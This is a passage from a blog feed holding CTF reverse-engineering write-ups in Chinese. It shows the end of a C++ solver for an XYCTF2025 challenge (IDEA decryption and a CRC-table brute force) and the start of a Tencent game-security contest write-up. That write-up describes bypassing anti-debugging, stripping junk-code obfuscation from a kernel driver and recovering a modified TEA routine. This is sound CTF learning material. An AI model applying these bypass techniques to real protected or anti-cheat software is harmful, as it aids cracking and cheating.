<span class="number">16</span>; k++)</span><br><span class="line">                sub_key[j][<span class="number">15</span> - k] = keys[<span class="number">127</span> - (k + <span class="number">16</span> * (j - <span class="number">8</span> - <span class="number">8</span> * i))];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">    keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">48</span>; i &lt; <span class="number">52</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * (i - <span class="number">48</span>))];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inv_subkeys_get</span><span class="params">(code sub_key[<span class="number">52</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span> - i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i + <span class="number">4</span>] = sub_key[<span class="number">46</span> - i];</span><br><span class="line">        inv_sub_key[i + <span class="number">5</span>] = sub_key[<span class="number">47</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">0</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">48</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">0</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">49</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">1</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">50</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">2</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">51</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">dencrypt</span><span class="params">(bitset&lt;<span class="number">64</span>&gt; cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bitset&lt;16&gt; I_1, I_2, I_3, I_4;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        I_1[<span class="number">15</span> - i] = cipher[<span class="number">63</span> - i];</span><br><span class="line">        I_2[<span class="number">15</span> - i] = cipher[<span class="number">47</span> - i];</span><br><span class="line">        I_3[<span class="number">15</span> - i] = cipher[<span class="number">31</span> - i];</span><br><span class="line">        I_4[i] = cipher[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bitset&lt;16&gt; tmp_1 = <span class="built_in">Times</span>(inv_sub_key[i], I_1);</span><br><span class="line">        bitset&lt;16&gt; tmp_2 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">1</span>], I_2);</span><br><span class="line">        bitset&lt;16&gt; tmp_3 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">2</span>], I_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_4 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">3</span>], I_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_5 = <span class="built_in">XOR</span>(tmp_1, tmp_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_6 = <span class="built_in">XOR</span>(tmp_2, tmp_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_7 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">4</span>], tmp_5);</span><br><span class="line">        bitset&lt;16&gt; tmp_8 = <span class="built_in">Plus</span>(tmp_6, tmp_7);</span><br><span class="line">        bitset&lt;16&gt; tmp_9 = <span class="built_in">Times</span>(tmp_8, inv_sub_key[i + <span class="number">5</span>]);</span><br><span class="line">        bitset&lt;16&gt; tmp_10 = <span class="built_in">Plus</span>(tmp_7, tmp_9);</span><br><span class="line">        I_1 = <span class="built_in">XOR</span>(tmp_1, tmp_9);</span><br><span class="line">        I_2 = <span class="built_in">XOR</span>(tmp_3, tmp_9);</span><br><span class="line">        I_3 = <span class="built_in">XOR</span>(tmp_2, tmp_10);</span><br><span class="line">        I_4 = <span class="built_in">XOR</span>(tmp_4, tmp_10);</span><br><span class="line">    &#125;</span><br><span class="line">    bitset&lt;16&gt; Y_1 = <span class="built_in">Times</span>(I_1, inv_sub_key[<span class="number">48</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_2 = <span class="built_in">Plus</span>(I_3, inv_sub_key[<span class="number">49</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_3 = <span class="built_in">Plus</span>(I_2, inv_sub_key[<span class="number">50</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_4 = <span class="built_in">Times</span>(I_4, inv_sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plaint;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plaint[i] = Y_4[i];</span><br><span class="line">        plaint[i + <span class="number">16</span>] = Y_3[i];</span><br><span class="line">        plaint[i + <span class="number">32</span>] = Y_2[i];</span><br><span class="line">        plaint[i + <span class="number">48</span>] = Y_1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plaint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">        <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">        <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">        <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">        <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">        <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">        <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">        <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">        <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">        <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">        <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">        <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">        <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">        <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">        <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">        <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">        <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">        <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">        <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">        <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">        <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">        <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">        <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">        <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">        <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">        <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">        <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">        <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">        <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">        <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">        <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">        <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">        <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">        <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">        <span class="number">0x46A95BAD</span>,</span><br><span class="line">        <span class="number">0x1CAC84B6</span>,</span><br><span class="line">        <span class="number">0xA67CB2B2</span>,</span><br><span class="line">        <span class="number">0x32188937</span>,</span><br><span class="line">        <span class="number">0x4872D39F</span>,</span><br><span class="line">        <span class="number">0xF2A2E59B</span>,</span><br><span class="line">        <span class="number">0x011B94D2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 爆破前7字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后16字节进行IDEA解密</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x5C</span>, <span class="number">0x2F</span>, <span class="number">0xD0</span>, <span class="number">0xEC</span>, <span class="number">0x82</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x57</span>,</span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x9F</span>, <span class="number">0x91</span>, <span class="number">0xF6</span>, <span class="number">0x95</span>, <span class="number">0xA4</span>, <span class="number">0xAC</span>, <span class="number">0x90</span>&#125;;</span><br><span class="line">    <span class="comment">// unsigned int key[4] = &#123;</span></span><br><span class="line">    <span class="comment">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x6C98B242</span>, <span class="number">0x78563412</span>, <span class="number">0x3E6A6D0D</span>, <span class="number">0xEFCDAB89</span>&#125;;</span><br><span class="line"></span><br><span class="line">    code keys_input[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        keys_input[<span class="number">2</span> * i + <span class="number">1</span>] = key[i] &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        keys_input[<span class="number">2</span> * i] = (key[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> result[<span class="number">16</span>];</span><br><span class="line">    bitset&lt;64&gt; cipher1, cipher2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cipher1[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">            cipher2[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i + <span class="number">8</span>] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">subkeys_get</span>(keys_input);</span><br><span class="line">    <span class="built_in">inv_subkeys_get</span>(sub_key);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plain1 = <span class="built_in">dencrypt</span>(cipher1);</span><br><span class="line">    bitset&lt;64&gt; plain2 = <span class="built_in">dencrypt</span>(cipher2);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> plain1_val = plain<span class="number">1.</span><span class="built_in">to_ullong</span>();</span><br><span class="line">    <span class="type">uint64_t</span> plain2_val = plain<span class="number">2.</span><span class="built_in">to_ullong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> dec2[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2, &amp;plain2_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2 + <span class="number">8</span>, &amp;plain1_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(dec2, dec2 + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, dec2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{moshui_build_this_block}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF2025-逆向WP&quot;&gt;&lt;a href=&quot;#XYCTF2025-逆向WP&quot; class=&quot;headerlink&quot; title=&quot;XYCTF2025 逆向WP&quot;&gt;&lt;/a&gt;XYCTF2025 逆向WP&lt;/h1&gt;&lt;p&gt;虽然这次失去Web手，但是配合新来的师傅，小</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP</title>
    <link href="https://tkazer.github.io/2025/03/31/2025Tencent/"/>
    <id>https://tkazer.github.io/2025/03/31/2025Tencent/</id>
    <published>2025-03-31T10:30:26.000Z</published>
    <updated>2025-03-31T10:31:52.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP"><a href="#2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP" class="headerlink" title="2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP"></a>2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这也是本菜鸡第一次参加该比赛，之前是有看过前几年比赛的WP，感觉难度不小，这次来尝试一下，由于是纯CTF类型，做起来还算顺手，不过也是遇到不少问题。经过半天的奋战最后还是解了出来，综合体验下来收获还是不少的。</p><h2 id="R3分析"><a href="#R3分析" class="headerlink" title="R3分析"></a>R3分析</h2><p>将ACEFirstRound.exe放入IDA分析，在main函数可以看到一个虚表，根据里面各个函数内容，将每个虚表函数都重新命名为对应功能。</p><p>发现是运行了ACEDriver驱动，与r3程序之间进行通信。</p><p><img src="/2025/03/31/2025Tencent/1.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/2.png" alt="alt text"></p><p>尝试动调发现没办法，发现程序退出，根据CheckRemoteDebuggerPresent的交叉引用发现一个反调试函数。</p><p><img src="/2025/03/31/2025Tencent/3.png" alt="alt text"></p><p>找该函数的交叉调用，发现是这边启了一个线程来启动反调试。</p><p><img src="/2025/03/31/2025Tencent/4.png" alt="alt text"></p><p>在该函数这边进行条件断点，修改rip，让代码直接执行到函数结束处，跳过中间反调试相关代码，即可绕过反调试。</p><p><img src="/2025/03/31/2025Tencent/5.png" alt="alt text"></p><p>动调分析，然后这边输入flag要求是以”ACE_”开头，然后去掉前面这四个字符，首先进行Base58加密，然后再将数据倒转。这边Base58是变表，和标准不一样，提取得：<code>abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789</code></p><p><img src="/2025/03/31/2025Tencent/6.png" alt="alt text"></p><p>与”sxx”进行循环xor。</p><p><img src="/2025/03/31/2025Tencent/7.png" alt="alt text"></p><p>最后通信发送到ACEDriver，命令码是0x154004。</p><p><img src="/2025/03/31/2025Tencent/8.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/9.png" alt="alt text"></p><p>至此R3层分析完毕。</p><h2 id="R0分析"><a href="#R0分析" class="headerlink" title="R0分析"></a>R0分析</h2><p>IDA载入ACEDriver.sys，发现有几个消息的Callback，但是跳转过来发现有混淆和花指令。</p><p><img src="/2025/03/31/2025Tencent/10.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/11.png" alt="alt text"></p><p>该驱动的混淆和花指令都是一个类型的，花指令是最基础的。</p><p>以下图为例子：</p><p>对41e9按u再跳过e9字节按c还原，即可pass花指令。</p><p><img src="/2025/03/31/2025Tencent/12.png" alt="alt text"></p><p>然后截图处是一块，将地址计算完进行jmp，计算出来实际就是jmp到下面pop处，说明这一段是无用的，可以直接将push到pop全部nop即可。其他地方都和这地方混淆差不多类型，都直接跳过花指令后nop即可。</p><p><img src="/2025/03/31/2025Tencent/13.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/14.png" alt="alt text"></p><p>但有一种比较特殊，并不是跳转到下面邻近代码处，而是jmp到其他代码处，观察push和底下pop寄存器是否一致就可以判断是哪一种类型，该种就得手动计算地址然后写jmp。</p><p>手动去除大部分混淆后，就可以看到几个回调的里面代码，MessageNotifyCallback里面的代码如下：</p><p><img src="/2025/03/31/2025Tencent/15.png" alt="alt text"></p><p>进入几层call就可以看到这边就是判断命令码执行，下面就是接收R3发送来的密文数据。</p><p><img src="/2025/03/31/2025Tencent/16.png" alt="alt text"></p><p>进入call发现就是关键处，unk_140004064那边就是flag密文，使用的是tea加密，key是[‘A’,’C’,’E’,’6’]，然后边加密边判断密文是否相等。</p><p><img src="/2025/03/31/2025Tencent/17.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/18.png" alt="alt text"></p><p>查看tea函数的交叉调用，发现有其他地方有出现。</p><p><img src="/2025/03/31/2025Tencent/19.png" alt="alt text"></p><p>在第四个call处，发现一个函数传入了tea加密的函数地址，然后进行了一系列变换，应该是对tea函数本体进行了修改。</p><p><img src="/2025/03/31/2025Tencent/20.png" alt="alt text"></p><p>将该函数代码和相关数据进行提取，对tea函数字节进行本地模拟操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 